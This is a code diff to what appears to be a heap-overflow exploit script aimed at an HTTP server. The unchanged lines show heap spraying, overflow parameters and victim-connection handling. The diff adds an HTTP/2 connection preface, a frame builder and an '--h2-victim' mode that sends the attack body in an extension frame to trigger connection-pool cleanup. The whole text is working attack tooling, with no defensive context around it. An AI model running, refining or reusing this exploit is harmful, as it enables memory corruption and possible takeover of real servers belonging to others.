@@ -9,6 +9,14 @@ BODY_LEN = 4000
 N_SPRAY = 20
 DEFAULT_A_COUNT = 349
 DEFAULT_PLUS_COUNT = 969
+H2_PREFACE = (
+    b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+    b"\x00\x00\x00"  # length
+    b"\x04"          # SETTINGS
+    b"\x00"          # flags
+    b"\x00\x00\x00\x00"
+)
+H2_EXTENSION_FRAME = 0x0B
 
 SAFE = set()
 _t = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
@@ -86,6 +94,18 @@ def make_slot_probe_body(nonce, marker_offset=24, stride=8):
     return bytes(body)
 
 
+def make_h2_frame(frame_type, payload, flags=0, stream_id=0):
+    if len(payload) > 0xFFFFFF:
+        print(f"[!] HTTP/2 frame payload too large: {len(payload)}")
+        sys.exit(1)
+    return (
+        len(payload).to_bytes(3, "big")
+        + bytes([frame_type, flags])
+        + (stream_id & 0x7FFFFFFF).to_bytes(4, "big")
+        + payload
+    )
+
+
 def wait_alive(host, port, timeout=30):
     for _ in range(timeout):
         try:
@@ -106,10 +126,15 @@ def attempt(
     body,
     upload_victim=False,
     delay_victim_body=False,
+    h2_victim=False,
     victim_body_len=65536,
     a_count=DEFAULT_A_COUNT,
     plus_count=DEFAULT_PLUS_COUNT,
 ):
+    if h2_victim and upload_victim:
+        print("[!] --h2-victim and --upload-victim are mutually exclusive")
+        return False
+
     sprays = []
     for i in range(N_SPRAY):
         try:
@@ -161,7 +186,14 @@ def attempt(
             pass
         return False
 
-    if upload_victim:
+    if h2_victim:
+        v.sendall(H2_PREFACE + make_h2_frame(H2_EXTENSION_FRAME, body))
+        v.settimeout(0.2)
+        try:
+            v.recv(128)
+        except (socket.timeout, ConnectionResetError, OSError):
+            pass
+    elif upload_victim:
         victim_body = b"V" * victim_body_len
         victim_headers = (
             b"POST /victim_upload HTTP/1.1\r\n"
@@ -258,6 +290,8 @@ def main():
                         help="use a large upload victim request with a real pool cleanup")
     parser.add_argument("--delay-victim-body", action="store_true",
                         help="send victim upload headers before the overflow and body after it")
+    parser.add_argument("--h2-victim", action="store_true",
+                        help="use an HTTP/2 connection victim with a connection-pool cleanup")
     parser.add_argument("--victim-body-len", type=int, default=65536,
                         help="body length for --upload-victim (default: 65536)")
     args = parser.parse_args()
@@ -334,6 +368,7 @@ def main():
                 body,
                 upload_victim=args.upload_victim,
                 delay_victim_body=args.delay_victim_body,
+                h2_victim=args.h2_victim,
                 victim_body_len=args.victim_body_len,
                 a_count=args.a_count,
                 plus_count=args.plus_count,
